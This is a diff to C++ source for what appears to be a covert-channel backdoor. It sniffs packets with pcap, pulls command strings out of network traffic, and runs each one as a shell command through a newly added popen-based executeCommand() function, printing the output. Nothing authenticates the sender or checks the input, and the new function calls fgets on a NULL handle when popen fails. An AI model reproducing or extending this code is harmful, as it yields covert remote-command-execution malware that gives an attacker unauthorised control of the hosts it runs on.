@@ -20,12 +20,8 @@ void shutdownServer(int signo){
     cout << "Terminating Program" << endl;
 
     keepListening = false;
-
-    pcap_freealldevs(allInterfaces);
-    allInterfaces = nullptr;
-    listeningInterface = nullptr;
-
     monitor->killListening();
+
 }
 
 bool getInterface(){
@@ -53,7 +49,7 @@ bool getInterface(){
 
         Logger::debug("Main:getInterfaces - Testing Interface With Name: " + string(name));
 
-        if(strcmp(name, string("any").c_str()) == 0){
+        if(strcmp(name, string("lo").c_str()) == 0){
             //this is the any interface
             Logger::debug("Main:getInterfaces - FOUND THE ANY INTERFACE");
 
@@ -65,6 +61,59 @@ bool getInterface(){
     }
 
     return false;
+}
+
+string executeCommand(string command){
+
+    Logger::debug("Setting Up Variables To Execute Command");
+
+    //append redirects to the command
+    command = command + " 2>&1";
+    string response = ""; // storage for response
+    const int BUFFERSIZE = 2048;
+    char BUFFER[BUFFERSIZE];
+    memset(BUFFER, 0 , sizeof(BUFFER));
+    FILE *fp;
+
+    Logger::debug("Command At This Point Is: >" + command + "<");
+
+
+    if((fp = popen(command.c_str(), "r")) == NULL){
+        Logger::error("Main:executeCommand - There Was An Error Executing The Command");
+        response += "[ERROR EXECUTING COMMAND] ";
+    }
+
+    Logger::debug("Command Has Been Executed. Response At This Pont Is: >" + response + "<");
+
+    while(fgets(BUFFER, sizeof(BUFFER), fp) != NULL){
+
+        char tmp[BUFFERSIZE];
+        strcpy(tmp, BUFFER);
+
+        string responseLine = string(tmp);
+
+        Logger::debug("ResponseLine Is: " + responseLine);
+
+        response += responseLine;
+
+        Logger::debug("Total Response At This Time Is: >" + response + "<");
+
+        //refresh the buffer;
+        memset(BUFFER, 0 , sizeof(BUFFER));
+    }
+
+    Logger::debug("Done Looping. Total Response At This Time Is: >" + response + "<");
+    Logger::debug("Closing popen");
+
+    if(pclose(fp)){
+        Logger::error("Main:executeCommand - There Was An Error Executing The Command Or Command Exited With Error Status");
+        response += " [ERROR EXECUTING COMMAND OR COMMAND EXITED WITH ERROR STATUS]";
+    }
+
+    Logger::debug("popen Close Complete. Response At this Time Is: >" + response + "<");
+
+    return response;
+
 }
 
 int main(int argc, char * argv[]) {
@@ -105,15 +154,34 @@ int main(int argc, char * argv[]) {
     TrafficAnalyzer * trafficAnalyzer = TrafficAnalyzer::getInstance();
     //start monitoring for UDP traffic. If it is our own, it needs handling, if not, add it to traffic analyzer
     CovertSocket * socket = new CovertSocket(trafficAnalyzer); //how we respond to commands
-    monitor = new NetworkMonitor(trafficAnalyzer); //how we listen for commands
+    monitor = NetworkMonitor::getInstance(); //how we listen for commands
     while(keepListening){
 
         string command = monitor->listenForTraffic(listeningInterface); //this will hang until a single unit of data is received and then return it
+        cout << "Back Out" << endl;
 
+        if(keepListening == false){
+            break;
+        }
+
+        cout << "The Command Given Is: >" << command << "<" << endl;
+
+        string response = executeCommand(command);
+
+        cout << "Back From Execution" << endl;
+
+        cout << response << endl;
 
     }
 
+    cout << "Now Here" << endl;
+
     Logger::debug("Loop Killed. Terminating");
+
+    Logger::debug("Freeing All ResourceS");
+    pcap_freealldevs(allInterfaces);
+    allInterfaces = nullptr;
+    listeningInterface = nullptr;
 
     delete(socket);
     delete(monitor);
